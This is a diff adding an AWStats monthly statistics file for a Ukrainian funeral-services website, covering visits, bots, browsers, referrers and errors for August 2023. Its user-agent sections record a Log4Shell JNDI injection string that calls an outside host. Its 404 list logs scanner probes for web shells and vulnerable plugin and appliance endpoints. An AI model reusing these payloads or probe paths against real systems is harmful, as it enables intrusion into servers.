@@ -1,0 +1,3189 @@
+AWSTATS DATA FILE 7.6 (build 20161204)
+# If you remove this file, all statistics for date 202308 will be lost/reset.
+# Last config file used to build this data file was /etc/awstats/awstats.omega-ritual.com.ua.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2002                
+POS_TIME 2686                
+POS_VISITOR 54623               
+POS_DAY 106470              
+POS_DOMAIN 3684                
+POS_LOGIN 3919                
+POS_ROBOT 4074                
+POS_WORMS 5592                
+POS_EMAILSENDER 5723                
+POS_EMAILRECEIVER 5866                
+POS_SESSION 107439              
+POS_SIDER 107653              
+POS_FILETYPES 6001                
+POS_DOWNLOADS 6365                
+POS_OS 6507                
+POS_BROWSER 6914                
+POS_SCREENSIZE 13628               
+POS_UNKNOWNREFERER 13702               
+POS_UNKNOWNREFERERBROWSER 14949               
+POS_ORIGIN 15406               
+POS_SEREFERRALS 15559               
+POS_PAGEREFS 15843               
+POS_SEARCHWORDS 16198               
+POS_KEYWORDS 16845               
+POS_MISC 2349                
+POS_ERRORS 17376               
+POS_CLUSTER 3775                
+POS_SIDER_404 17598               
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20230901000457 541 135841 11770446861489
+FirstTime 20230801004815
+LastTime 20230831235324
+LastUpdate 20230901045937 541 0 540 0 0
+TotalVisits 2797                
+TotalUnique 1272                
+MonthHostsKnown 0                   
+MonthHostsUnknown 1323                
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+FlashSupport 0 0 0
+JavaEnabled 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+DirectorSupport 0 0 0
+AddToFavourites 0 75 0
+JavascriptDisabled 0 0 0
+QuickTimeSupport 0 0 0
+PDFSupport 0 0 0
+TotalMisc 0 0 0
+RealPlayerSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 311 747 28889091 169 274 4257094
+1 259 365 14380363 266 391 4885546
+2 282 404 16415430 272 441 6394265
+3 260 418 20791250 267 489 8821191
+4 193 320 13269512 275 416 5448541
+5 362 387 13932374 206 267 3050045
+6 844 1014 14875636 159 332 4100999
+7 205 514 16778754 207 297 3819416
+8 278 1069 26588346 217 329 3450153
+9 222 1189 30548662 248 445 6026575
+10 277 1416 36678149 219 338 4423203
+11 282 1805 49771997 243 294 4035000
+12 380 1480 41781483 310 376 6643406
+13 346 1108 34659290 239 452 6532764
+14 354 1561 40949404 236 290 5021685
+15 438 1868 48594800 268 301 4386852
+16 413 1427 44090897 195 284 3441771
+17 271 1052 27468644 205 321 6688238
+18 378 1442 39061852 273 336 5373474
+19 409 1899 49996755 215 390 4156610
+20 1398 2475 37921625 281 398 6545423
+21 344 1515 39734251 285 536 11197831
+22 233 775 22539149 214 309 4793389
+23 242 631 17545333 198 365 4771913
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 1
+ip 8981 26881 727263047
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 35
+wordpress 1629 5138197 20230831235320 0
+bingbot/ 950 8984455 20230831114902 30
+Googlebot/ 647 11402148 20230830145737 29
+AdsBot\-Google[\x20]\( 547 3876703 20230830025305 0
+AhrefsBot/ 343 9878030 20230831212424 58
+core 220 8020489 20230826055131 1
+yandex 179 1496001 20230830124034 0
+YandexBot/ 176 4181548 20230831215544 70
+bot[\s_+:,\.\;\/\\-] 144 3646966 20230830024929 10
+MegaIndex\.ru/ 66 2160958 20230826182416 1
+facebookexternalhit/ 11 368423 20230831024308 0
+Googlebot\-News 1 733 20230825145718 0
+Googlebot\-Mobile/ 1 733 20230825145701 0
+feed 2 856 20230819191418 2
+DuckDuckGo\-Favicons\-Bot/ 24 746236 20230831155046 0
+Googlebot\-Image/ 41 883278 20230831211435 0
+netcraft 2 498349 20230806234321 0
+python 21 496677 20230829175054 5
+CFNetwork 29 274892 20230813100617 0
+(firefox/)([0-9]\.|[0-1][0]\.) 7 246959 20230830105945 0
+libwww\-perl 1 249175 20230802010508 0
+java 1 226 20230805212602 0
+MSIE[\x20]6 1 1653 20230825145718 0
+custo 5 1233552 20230830193431 0
+[\s_+:,\.\;\/\\-]bot 2 66590 20230825031544 0
+baidu 1 733 20230825145659 0
+unknown 63 26800 20230830085349 63
+no_user_agent 24 4650177 20230829202349 0
+ELinks/ 1 733 20230825145658 0
+dataprovider\.com 63 2354584 20230820031940 1
+Applebot/ 49 468546 20230816032018 2
+TelegramBot 4 181123 20230821141734 0
+Dalvik/ 3 98872 20230818211554 0
+Firefox/1\.5 19 651588 20230803211223 0
+Konqueror/ 1 733 20230825145658 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 15
+Unknown 41 2162354 0 0
+js 5879 49877989 0 0
+php 3673 5862475 0 0
+jpg 2378 146349491 0 0
+xml 1 822 0 0
+webp 266 6930022 0 0
+woff2 363 2494988 0 0
+ttf 2 12085 0 0
+png 3403 138324657 0 0
+html 4630 341125568 0 0
+txt 4 7790 0 0
+css 2754 18814993 0 0
+svg 3482 15285361 0 0
+woff 2 1466 0 0
+eot 3 12986 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 2
+//wp-includes/ID3/license.txt 2 0 3378
+/wp-content/plugins/contact-form-7/readme.txt 2 0 4412
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 24
+macosx11 41 3
+winvista 3 3
+macosx6 2 1
+macosx 3385 263
+macosx12 3 2
+Unknown 2447 2423
+winlong 13 12
+linuxubuntu 5 0
+win8 7 7
+bsdopenbsd 1 1
+linux 1907 1460
+psp 1 0
+macosx8 3 3
+winnt 6 6
+win8.1 159 87
+macosx9 10 10
+linuxandroid 7250 1138
+win7 469 140
+macosx10 45 45
+winphone 1 0
+ios_ipad 158 9
+win10 7329 3096
+winxp 30 29
+ios_iphone 3606 243
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 315
+chrome41.0.2272.101 2 2
+chrome113.0.0.0 124 13
+msie11.0 104 6
+firefox115.0 43 2
+chrome78.0.3904.96 1 0
+firefox33.0 1 1
+chrome47.0.2526.76 1 1
+chrome71.0.3578.99 81 2
+galeon 2 0
+chrome53.0.2785.116 77 4
+chrome88.0.4324.181 1 0
+chrome66.0.3359.117 4 4
+chrome110.0.0.0 32 4
+chrome65.0.3325.181 8 8
+chrome76.0.3809.111 5 1
+firefox96.0 3 3
+chrome103.0.5060.114 12 12
+chrome14.0.825.0 1 0
+firefox75.0 4 4
+chrome68.0.3440.70 1 1
+edge18 1 1
+chrome80.0.3987.132 4 4
+chrome73.0.3683.86 4 3
+chrome103.0.5060.66 4 4
+chrome60.0.3112.107 17 17
+chrome40.0.2214.93 2 2
+chrome35.0.3319.102 4 4
+chrome46.0.2490.71 2 2
+chrome36.0.1985.125 4 4
+chrome73.0.3683.75 1 1
+chrome36.0.1985.67 6 6
+safari17.0 59 2
+firefox62.0 1232 1232
+chrome105.0.0.0 86 26
+firefox78.0 1 1
+chrome72.0.3626.121 46 5
+chrome118.0.0.0 38 0
+chrome64.0.3282.167 1 1
+safari 850 68
+chrome80.0.3987.149 4 4
+chrome55.0.2919.83 3 3
+opera40.0.2308.62 1 0
+firefox58.0 4 4
+firefox51.0 4 4
+opera15.0.1147.24 2 0
+safari15.1 52 3
+firefox99.0 2 2
+firefox76.0 1 1
+chrome67.0.3396.87 4 1
+chrome41.0.2228.0 2 1
+firefox41.0 3 3
+chrome44.0.2403.155 2 2
+chrome86.0.4240.193 2 2
+chrome46.0.2490.86 4 4
+chrome110.0.5481.154 46 6
+chrome69.0.3497.100 6 6
+safari5.1 1 0
+chrome80.0.3987.106 3 3
+firefox59.0 2 2
+chrome108.0.0.0 26 26
+opera54.0.2952.71 1 0
+safari10.0 2 1
+chrome17.0.939.0 1 0
+opera76.2.4027.73374 93 10
+firefox56.0 1 1
+firefox117.0 99 1
+chrome89.0.4389.114 10 10
+safari16.5 623 34
+chrome87.0.4280.88 66 7
+chrome36.0.1944.0 3 3
+chrome65.0.3325.220 1 0
+chrome30.0.1599.101 1 0
+firefox71.0 3 3
+chrome37.0.2049.0 10 10
+chrome53.0.2785.143 119 10
+chrome62.0.3202.94 3 2
+firefox32.0 1 0
+chrome57.0.2987.133 4 3
+chrome81.0.4044.122 3 3
+safari11.0.3 1 1
+firefox36.0 2 2
+opera95.0.0.0 74 2
+firefox52.0 8 6
+opera89.0.4447.51 1 1
+opera100.0.0.0 42 2
+chrome47.0.2526.106 2 2
+chrome103.0.5042.0 6 6
+chrome95.0.4638.69 1048 1046
+chrome34.0.1847.116 7 7
+chrome83.0.4103.97 60 46
+chrome6.0.464.0 1 0
+firefox111.0 3 3
+firefox94.0 1 1
+firefox55.0 1 1
+chrome102.0.0.0 1 1
+chrome81.0.4044.113 1 1
+chrome78.0.3904.108 1 1
+opera60.0.3255.83 1 0
+chrome70.0.3538.77 5 5
+firefox43.0 2 1
+chrome104.0.0.0 26 26
+chrome107.0.0.0 1 1
+chrome49.0.2623.112 4 4
+lg\- 1 1
+firefox28.0 12 12
+chrome78.0.3904.97 4 4
+chrome63.0.3239.84 2 2
+edge17 1 1
+firefox72.0 3 3
+firefox87.0 1 1
+chrome83.0.4103.116 2 2
+chrome75.0.3770.101 3 0
+opera62.0.3331.116 1 0
+firefox82.0 1 1
+chrome91.0.4472.114 219 35
+firefox77.0 5 5
+mozilla 822 804
+chrome114.0.5735.196 2 0
+chrome81.0.4044.117 1 0
+chrome106.0.0.0 1 1
+chrome52.0.2762.73 5 5
+chrome81.0.4044.129 2 2
+firefox85.0 1 1
+safari16.5.2 446 25
+firefox80.0 1 1
+chrome41.0.2226.0 5 5
+firefox69.0 1 1
+netscape5.0 3 3
+firefox45.0 3 3
+firefox116.0 355 36
+firefox98.0 1 1
+safari11.1.2 1 1
+chrome58.0.3029.110 4 4
+chrome55.0.2883.87 3 3
+iphone 3 0
+chrome38.0.2125.111 26 26
+chrome34.0.1866.237 1 1
+chrome4.0.277.0 1 0
+safari4.0.5 1 0
+firefox91.0 2 2
+firefox61.0 5 5
+firefox112.0 3 1
+chrome103.0.5060.134 1 1
+chrome46.0.2490.80 4 4
+chrome47.0.2526.111 3 3
+chrome95.0.4638.74 62 14
+chrome94.0.4606.85 1 0
+chrome78.0.3879.0 1 0
+chrome53.0.2710.66 1 1
+chrome83.0.4103.101 38 2
+safari16.3 88 4
+safari15.6.1 72 2
+opera75.0.3969.171 1 1
+chrome79.0.3945.88 5 5
+chrome105.0.5195.136 1 0
+chrome21.0.1180.83 1 1
+chrome80.0.3987.162 1 1
+chrome41.0.2227.1 2 2
+chrome60.0.3112.113 6 6
+android 9 3
+chrome54.0.2840.99 1 1
+chrome101.0.0.0 39 2
+chrome117.0.0.0 53 0
+chrome115.0.5790.170 55 2
+epiphany 1 0
+chrome74.0.3729.136 1 0
+chrome80.0.3987.99 1 0
+chrome75.0.3770.90 1 0
+chrome70.0.3538.67 7 7
+ibrowse 4 0
+chrome99.0.4844.88 30 2
+chrome52.0.2960.98 1 1
+chrome108.0.5359.98 10 4
+chrome103.0.0.0 68 68
+chrome60.0.3112.90 2 2
+firefox48.0 2 2
+chrome83.0.4103.61 18 1
+chrome76.0.3809.100 1 1
+chrome73.0.3683.90 1 0
+chrome112.0.5615.136 84 11
+chrome51.0.2704.103 1 0
+firefox49.0 1 1
+chrome35.0.2309.372 5 5
+chrome61.0.3163.100 3 2
+safari12.1.2 64 3
+chrome66.0.3359.181 4 4
+firefox97.0 1 1
+chrome35.0.2117.157 2 2
+firefox92.0 1 1
+chrome70.0.3538.110 27 2
+firefox103.0 1 1
+chrome115.0.0.0 5618 904
+safari16.5.1 116 4
+chrome41.0.2227.0 2 1
+chrome41.0.2225.0 6 6
+safari16.1 250 21
+chrome84.0.4147.135 1 1
+opera75.0.3969.149 1 1
+safari16.0 220 14
+chrome73.0.3683.103 1 0
+chrome90.0.4430.212 1 1
+chrome63.0.3239.132 8 6
+chrome85.0.4183.102 2 2
+chrome69.0.3497.128 1 0
+chrome56.0.2924.87 6 4
+firefox114.0 13 3
+chrome5.0.375.99 3 3
+chrome39.0.2171.99 1 1
+firefox100.0 1 1
+chrome87.0.4280.101 2 0
+chrome62.0.3202.89 2 2
+chrome94.0.4590.2 113 9
+chrome34.0.1847.137 3 3
+chrome114.0.0.0 1213 292
+chrome75.0.3770.100 4 0
+chrome77.0.3865.90 1 1
+chrome48.0.2564.116 3 3
+firefox67.0 5 5
+chrome63.0.3282.92 1 1
+chrome116.0.0.0 2508 410
+chrome41.0.2224.3 3 3
+safari16.6 957 67
+firefox66.0 4 4
+chrome39.0.2171.95 39 39
+chrome99.0.3538.77 424 29
+chrome48.0.2564.109 2 2
+chrome30.0.1599.103 1 0
+sonyericsson 1 0
+chrome79.0.3945.130 9 9
+opera102.0.0.0 2 2
+chrome95.0.4638.54 1 1
+chrome4.0.249.0 1 0
+firefox63.0 3 3
+chrome70.0.3538.102 2 2
+chrome86.0.4240.198 1 1
+firefox74.0 2 2
+firefox40.0 3 3
+chrome79.0.3945.117 5 5
+chrome84.0.4147.105 29 4
+chrome80.0.3987.163 3 3
+chrome79.0 833 833
+firefox90.0 3 3
+chrome96.0.4664.104 40 4
+netscape4.0 1 0
+chrome109.0.0.0 823 122
+chrome110.0.5481.38 31 2
+chrome76.0.3809.87 1 0
+chrome74.0.3729.169 13 10
+firefox38.0 4 4
+opera10.10 1 0
+chrome103.0.5060.53 1 1
+chrome59.0.3071.115 3 3
+chrome94.0.4606.61 34 10
+firefox84.0 2 2
+chrome101.0.4951.61 1 1
+chrome35.0.1916.47 2 2
+chrome84.0.4147.125 91 91
+chrome25.0.1364.160 1 0
+chrome111.0.0.0 1 0
+safari13.0 43 5
+firefox70.0 4 4
+chrome64.0.3282.140 4 3
+chrome60.0.3112.101 1 1
+chrome75.0.3770.143 2 0
+firefox54.0 1 1
+firefox47.0 2 2
+chrome78.0.3904.70 4 4
+chrome55.0.2869.0 1 0
+chrome112.0.0.0 2196 122
+chrome73.0.3683.88 1 0
+firefox30.0 2 2
+chrome100.0.4896.127 3 3
+chrome55.0.2876.0 1 0
+chrome81.0.4044.138 1 1
+safari15.6.4 98 5
+chrome111.0.5563.116 402 59
+chrome68.0.3440.106 2 2
+chrome75.0.3770.145 1 0
+chrome115.0.5790.166 134 32
+chrome114.0.5735.198 1 1
+opera12.14 1 1
+chrome54.0.2866.71 3 3
+chrome51.0.2704.106 2 2
+chrome79.0.3945.79 50 2
+firefox68.0 2 2
+chrome90.0.4430.93 2 2
+chrome50.0.2661.89 1 0
+chrome64.0.3282.186 2 2
+chrome67.0.3396.99 1 1
+safari16.2 50 4
+chrome9.0.601.0 1 0
+safari11.0 1 1
+opera101.0.0.0 235 37
+chrome98.0.4758.87 1 0
+Unknown 1616 1611
+chrome89.0.4389.82 4 4
+opera20.0.1387.91 1 1
+edge16 1 1
+safari12.1.1 1 0
+firefox57.0 1 1
+firefox73.0 1 1
+chrome109.0.5414.120 42 2
+chrome115.0.5790.138 6 0
+opera62.0.3331.117 1 0
+safari9.0 53 3
+chrome32.0.1700.107 2 2
+chrome52.0.2743.116 4 4
+chrome37.0.2062.124 3 3
+opera67.0.3575.31 171 10
+chrome76.0.3809.89 3 1
+firefox88.0 3 3
+firefox95.0 91 91
+chrome74.0.3729.131 5 5
+chrome74.0.3729.157 4 2
+chrome115.0.5790.168 1 0
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 16
+${jndi:ldap://${:-284}${:-515}.${hostName}.useragent.cj94207mlg3fdkvtirogdecg45zcfrgkd.oast.site} 20230809142316
+Iframely/1.3.1_(_https://iframely.com/docs/about) 20230820090020
+Mozilla/5.0_AppleWebKit/537.36_(KHTML,_like_Gecko)_Chrome/74.0.3729.131_Safari/537.36 20230826112600
+Mozilla/5.0_(compatible;_Let's_Encrypt_validation_server;__https://www.letsencrypt.org) 20230813133639
+Iframely/1.3.1_(_https://iframely.com/docs/about)_Atlassian 20230820090020
+axios/1.4.0 20230820111930
+SonyEricssonW580i/R6BC_Browser/NetFront/3.3_Profile/MIDP-2.0_Configuration/CLDC-1.1 20230825145717
+Mozilla/5.0_(compatible;HostTracker/2.0;_http://www.host-tracker.com/) 20230831232606
+Mozilla/4.0_(compatible;_ms-office;_MSOffice_16) 20230816084919
+GuzzleHttp/7 20230824062939
+LG-GC900/V10a_Obigo/WAP2.0_Profile/MIDP-2.1_Configuration/CLDC-1.1 20230825145701
+Mozilla/5.0_(compatible;_InternetMeasurement/1.0;__https://internet-measurement.com/) 20230821104836
+ViberUrlDownloader 20230828164156
+Mozilla/5.0_researchscan.comsys.rwth-aachen.de 20230818133718
+WP_Rocket/Preload 20230831235324
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20230825093157
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 7
+GuzzleHttp/7 20230824062939
+WP_Rocket/Preload 20230831235324
+Iframely/1.3.1_(_https://iframely.com/docs/about) 20230820090020
+${jndi:ldap://${:-284}${:-515}.${hostName}.useragent.cj94207mlg3fdkvtirogdecg45zcfrgkd.oast.site} 20230809142316
+axios/1.4.0 20230820111930
+Iframely/1.3.1_(_https://iframely.com/docs/about)_Atlassian 20230820090020
+ViberUrlDownloader 20230828164156
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 5871 6451
+From1 13 13
+From2 315 354
+From3 796 796
+From4 1986 19267
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 9
+yandexru 10 10
+www_google_com_ua 51 56
+google_com 0 4
+duckduckgo 2 2
+www_google_com 243 273
+www_google_de 1 1
+yandex 2 2
+bing 4 4
+baidu 2 2
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 10 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 5
+http://www.host-tracker.com/UptimeGraph/Graph/f02777b2-af01-47de-b3f4-cfc7ef7ceaef 792 792
+http://176.114.0.75:80 1 1
+https://ukr.otzywy.com/redirect/ 1 1
+https://www.seo-ap.ru 1 1
+https://css.viber.com 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 8
+https+//omega-ritual.com.ua/uk/ 3
+https+//omega-ritual.com.ua/kontakty/ 1
+https+//omega-ritual.com.ua/ 1
+https+//omega-ritual.com.ua/venki-na-pohorony/ 1
+https+//omega-ritual.com.ua/pohoronnyj-nabor/ 1
+https+//omega-ritual.com.ua/portret-na-pohorony/ 1
+https+//omega-ritual.com.ua/venok-iz-zhivyh-cvetov/ 1
+%d1%82%d1%80%d0%b0%d1%83%d1%80%d0%bd%d1%8b%d0%b9+%d0%b2%d0%b5%d0%bd%d0%be%d0%ba+%d0%b8%d0%b7+%d0%b6%d0%b8%d0%b2%d1%8b%d1%85+%d1%86%d0%b2%d0%b5%d1%82%d0%be%d0%b2+%d0%ba%d0%b8%d0%b5%d0%b2 1
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 14
+https 9
+//omega-ritual.com.ua/uk/ 3
+%d1%86%d0%b2%d0%b5%d1%82%d0%be%d0%b2 1
+//omega-ritual.com.ua/portret-na-pohorony/ 1
+//omega-ritual.com.ua/kontakty/ 1
+%d1%82%d1%80%d0%b0%d1%83%d1%80%d0%bd%d1%8b%d0%b9 1
+%d0%ba%d0%b8%d0%b5%d0%b2 1
+//omega-ritual.com.ua/venki-na-pohorony/ 1
+//omega-ritual.com.ua/venok-iz-zhivyh-cvetov/ 1
+//omega-ritual.com.ua/ 1
+%d0%b6%d0%b8%d0%b2%d1%8b%d1%85 1
+%d0%b2%d0%b5%d0%bd%d0%be%d0%ba 1
+%d0%b8%d0%b7 1
+//omega-ritual.com.ua/pohoronnyj-nabor/ 1
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 11
+301 427 209799
+401 2 1424
+500 366 511308
+503 67 23839
+403 77 32824
+404 2250 55087348
+302 63 30196
+400 51 25379
+201 3 3149
+405 5 1804
+409 6 18948
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 967
+/wp-json/pie/v1/login 1 -
+/about.php 12 omega-ritual.com.ua
+/wp-admin/css/colors/coffee/about.php 1 www.google.com
+/wp-content/plugins/paid-memberships-pro/js/updates.js 2 -
+/apple-touch-icon-152x152-precomposed.png 1 -
+/wp-json/igd/v1/get-users-data 1 -
+/css/load.php 12 -
+/filemanager/upload.php 2 -
+/catalog-portal/ui/oauth/verify 1 -
+/wp-content/plugins/page-flip-image-gallery/upload.php 1 -
+/wp-content/uploads/bala.php 1 -
+/wp-content/bala.php 1 -
+/wp-stopstore.php 3 -
+/wp-content/plugins/capability-manager-enhanced/readme.txt 2 -
+/wp-content/plugins/mobile-menu/readme.txt 1 -
+/inputs.php 17 omega-ritual.com.ua
+/directdata/direct/router 1 -
+/v1/folder 1 -
+/webui/ 1 -
+/test/wp-admin/install.php 2 -
+/3011.php 1 -
+/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php 1 -
+/cgi-bin/my1.php 1 www.google.com
+/wp-content/plugins/simple-file-list/ee-file-engine.php 1 -
+/authenticationendpoint/2ul3xultxdzs3hclaremcyo62ta.jsp 1 -
+/.well-knownold/wso112233.php 1 -
+/backup/config.xml 1 -
+/wp-content/themes/construction-master/sections/theme.php 1 omega-ritual.com.ua
+/wp-content/plugins/foogallery/readme.txt 1 -
+/wp-content/plugins/capabilities-pro/readme.txt 1 -
+/wp-content/plugins/wpcargo/includes/2ThgbaTGQ7SZXvNi0xBZnoFyIbH.php 2 -
+/api/user/reg 1 -
+/Collector/appliancesettings/applianceSettingsFileTransfer 1 -
+/webapi/auth 1 -
+/wp-content/plugins/best-woocommerce-feed/readme.txt 1 -
+/OA_CGI/FNDWRR.exe 1 -
+/guestaccess.aspx 1 -
+/admin/uploads.php 1 -
+/app-ads.txt 1 -
+/yglycbgb.php 1 www.google.com
+/.well-known/pki-validation/ 4 www.google.com
+/wp-content/plugins/hellopress/wp_filemanager.php 1 www.google.com
+/secure/ContactAdministrators!default.jspa 1 -
+/sysinfo.cgi 4 http://omega-ritual.com.ua/sysinfo.cgi
+/remote/fgt_lang 1 -
+/wp-content/plugins/lbg-bottom-playlist-videoplayer/js/uploadify/uploadify.css 1 -
+/page 1 -
+/cgi-bin/file_transfer.cgi 1 -
+/wp-content/plugins/wp-clearlineee/bradly.php 3 -
+/esp/cms_changeDeviceContext.esp 1 -
+/suite-api/api/auth/token/acquire 2 https://omega-ritual.com.ua/ui/
+/api/console/api_server 2 -
+/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/fuel/pages/select/ 2 -
+/wp-content/plugins/press/wp-class.php 4 www.google.com
+/wp-content/themes/kingclub-theme/include/lang_upload.php 1 -
+/wls-wsat/CoordinatorPortType 3 -
+/cgi-bin/admin.cgi 1 -
+/wp-content/plugins/booking-calendar/readme.txt 2 -
+/app 14 http://omega-ritual.com.ua/app
+/fileupload/toolsAny 1 -
+/db_dump.php 1 https://omega-ritual.com.ua/user_add.php
+/c42api/v3/LoginConfiguration 1 -
+/webtools/control/SOAPService 1 -
+/dropdown.php 5 -
+/seeyon/test123456.jsp 1 -
+/security.txt 1 http://www.omega-ritual.com.ua/security.txt
+/servlets/OmaDsServlet 2 -
+/admin/user.php 1 -
+/CTCWebService/CTCWebServiceBean/ConfigServlet 1 -
+/en/php/usb_sync.php 1 -
+/blog/ 1 -
+/compliancepolicies.inc.php 2 -
+/wp-admin/shell20211028.php 1 -
+/wp-content/plugins/buddyforms/readme.txt 1 -
+/cgi-bin/fax_change_faxtrace_settings 1 -
+/mifs/j_spring_security_check 1 https://omega-ritual.com.ua/mifs/user/login.jsp
+/ajaxPages/writeBrowseFilePathAjax.php 1 -
+/wp-content/themes/mero-magazine/ws.php 1 -
+/v1/submissions 1 -
+/wp 17 -
+/wp-content/plugins/Cache/Cache.php 6 www.google.com
+/wp-add.php 1 omega-ritual.com.ua
+/2020 3 www.google.com
+/services/pluginscript/.. 1 -
+/info 1 -
+/scripts/unlock_tasks.php 2 -
+/wp-clearline.php 1 -
+/load.php 3 -
+/api/ping/ 1 -
+/wp-includes/class-wp-upgrade.php 1 -
+/.well-knownold/shell20211028.php 1 -
+/web 5 -
+/wp-content/plugins/seoo/alfa-ioxi1.PHP 1 -
+/wp-22.php 2 -
+/admin-post.php 3 -
+/AdminPage/conf/runCmd 1 -
+/analytics/telemetry/ph/api/hyper/send 1 -
+/Items/RemoteSearch/Image 2 -
+/wp-content/themes/spikes-black/include/lang_upload.php 1 -
+/wp-content/themes/hello-element/footer.php 1 www.google.com
+/admin/elfinder/elfinder-cke.html 1 -
+/api/hassio/app/.%09./supervisor/info 1 -
+/solr/admin/collections 1 -
+/apple-touch-icon-120x120-precomposed.png 3 -
+/wp-content/themes/shell20211028.php 1 -
+/wp/wp-content/themes/construction-master/sections/theme.php 1 omega-ritual.com.ua
+/PhoneBackup/2ThgbVf5k0hUaOOkqfdbYk60FNS.php 2 -
+/wp-content/plugins/wordpresss3cll/up.php 1 -
+/wp-json/oembed/1.0/embed 36 https://omega-ritual.com.ua/wp-json/oembed/1.0/embed
+/wp-content/themes/westand/include/lang_upload.php 1 -
+/api/v2/cmdb/system/admin/admin 1 -
+/ 30 -
+/wp-content/plugins/ioptimization/IOptimize.php 1 www.google.com
+/admin/view_car.php 1 http://omega-ritual.com.ua/admin/view_car.php
+/rindex.php 1 www.google.com
+/my-account/ 1 -
+/Upload/upload_file.php 1 -
+/pages/doenterpagevariables.action 1 -
+/var 2 https://omega-ritual.com.ua
+/invoker/readonly 2 -
+/j_security_check 3 https://omega-ritual.com.ua
+/configWizard/keyUpload.jsp 1 -
+/installer 1 http://omega-ritual.com.ua/installer
+/.well-known/acme-challenge/cloud.php 1 www.google.com
+/kontakti/ru 18 https://omega-ritual.com.ua/kontakti/ru
+/wp-content/themes/pridmag/db.php 5 -
+/banker/index.php 2 -
+/.well-known/apple-app-site-association 8 -
+/ipython/tree 2 -
+/wp-admin/css/colors/blue/VzlaTeam.php 1 -
+/wp/ 1 -
+/webGui/images/green-on.png/ 1 -
+/wp-content/themes/pridmag/about.php 3 -
+/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php 1 -
+/log.php 1 -
+/.well-known/security.txt 1 http://www.omega-ritual.com.ua/.well-known/security.txt
+/user/City_ajax.aspx 1 -
+/wp-content/plugins/shortcode-addons/readme.txt 1 -
+/wp-content/themes/bala.php 1 -
+/wp-content/plugins/ht-mega-for-elementor/assets/css/htbbootstrap.css 3 -
+/wp-content/themes/soccer-theme/include/lang_upload.php 1 -
+/dashboardUser 1 -
+/wp-content/plugins/seoplugins/db.php 4 -
+/wp-content/themes/wso112233.php 1 -
+/old/ 1 -
+/wp-story.php 8 -
+/login.html 1 -
+/wp-content/plugins/woocommerce-payments/assets/css/admin.css 1 -
+/WP 3 www.google.com
+/cjfuns.php 2 omega-ritual.com.ua
+/wp-content/plugins/ccx/ 3 www.google.com
+/webmail/basic/ 1 -
+/services/getFile.cmd 1 -
+/api/edr/sangforinter/v2/cssp/slog_client 1 -
+/system/deviceInfo 1 -
+/wp-admin/css/colors/blue/uploader.php 1 -
+/jenkins/script 1 -
+/classes/Master.php 3 -
+/wp-content/plugins/wp-payeezy-pay/donate.php 2 -
+/wp-content/plugins/armember-membership/readme.txt 1 -
+/wp-content/plugins/js-support-ticket/readme.txt 1 -
+/wp-option.php 1 -
+/wp-content/plugins/seoo/alfa-ioxi.php 1 -
+/wp-content/themes/Divi/404.php 3 omega-ritual.com.ua
+/_ignition/health-check/ 3 http://omega-ritual.com.ua/_ignition/health-check/
+/mgmt/tm/util/bash 1 -
